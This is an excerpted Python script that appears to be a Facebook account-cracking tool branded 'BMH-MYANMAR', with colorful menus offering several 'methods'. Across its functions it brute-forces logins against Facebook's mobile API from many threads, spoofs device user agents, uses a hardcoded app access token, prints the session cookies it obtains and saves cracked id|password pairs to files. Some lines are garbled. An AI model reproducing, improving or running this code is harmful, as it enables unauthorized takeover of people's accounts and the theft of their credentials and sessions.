...
def menu():
			...
			if xd in ['1','01']:
				...
				print('  working tool ')
				linex()
				print(' \033[1;32m[1] \033[1;34mMethod  (for mix id☺️) \033[1;31m  (best)  \n\033[1;38m [2]\033[1;35m Method  (With Your Father)\033[1;34m   (v.fast☺️) \n\033[1;38m [3]\033[1;32m Method  (for new id🖕)\033[1;31m   (best) \n \033[1;33m[4] \033[1;35mMethod  (for new id☺️) \033[1;31m  (slow) \n \033[1;36m[5] \033[1;39mMethod  (for new id☺️) \n \033[1;38m[6] \033[1;34mMethod  (for new id☺️) \n \033[1;32m[7] \033[1;35mMethod  (for new id☺️) ')
				linex()
				mthd=input(' Choice: ')
				linex()
				plist = []
				...
				clear()
				print(' Do you went show cp  (y☺️/n🖕): ')
				linex()
				cx=input(' Choice: ')
...
def gmail():
		...
		pxc = input(' Choise : ')
		clear()
		print('\033[1;31m [1] \033[1;34mMethod   (best)  \033[1;35m \n [2] \033[1;36mMethod   (v-best)  \033[1;38m \n [3] \033[1;37mMethod   (slow) \033[1;329m \n [4] \033[1;35mMethod   (slow)  \033[1;34m \n [5] \033[1;33mMethod   (slow) ')
		linex()
		mthd = input(' Choise: ')
		linex()
		print(' Getting mails...🖕🖕')
		...
		with tred(max_workers=30) as SK:
			...
			for user in fo:
				...
				if mthd in ['1','01']:
					BMH.submit(trt1,ids,passlist)
				if mthd in ['2','02']:
					BMH.submit(trt2,ids,passlist)
				if mthd in ['3','03']:
					BMH.submit(trt3,ids,passlist)
				if mthd in ['4','04']:
					BMH.submit(trt4,ids,passlist)
				if mthd in ['5','05']:
					BMH.submit(trt5,ids,passlist)
		print('\033[1;37m')
		linex()
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [BMH-MYANMAR-OK☺️🤌] '+ids+' | '+pas+'\033[1;97m')
...
"Content-Length": "329",}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [BMH-OK☺️🤌] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
...
def api4(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana';'com.facebook.lite';'com.facebook.orca'
                        ua = 'Davik/2.1.0 (Linux; U; Android';'iPhone; CPU iPhone OS 15_5 like Mac OS X'+android_version+'.0.5; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2376};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
def trt1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;36m [BMH-M0-MYANMAR] %s|\033[1;35mOK:-%s \033[1;34m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/BMH-LEE-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/BMH-LEE-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				...
				open('/sdcard/BMH-LEE-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;208m [BMH-MYANMAR-CP] '+ids+' | '+pas+'\033[1;96m')
				open('/sdcard/BMH-LEE-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						open('/sdcard/BMH-LEE-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					open('/sdcard/BMH-LEE-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
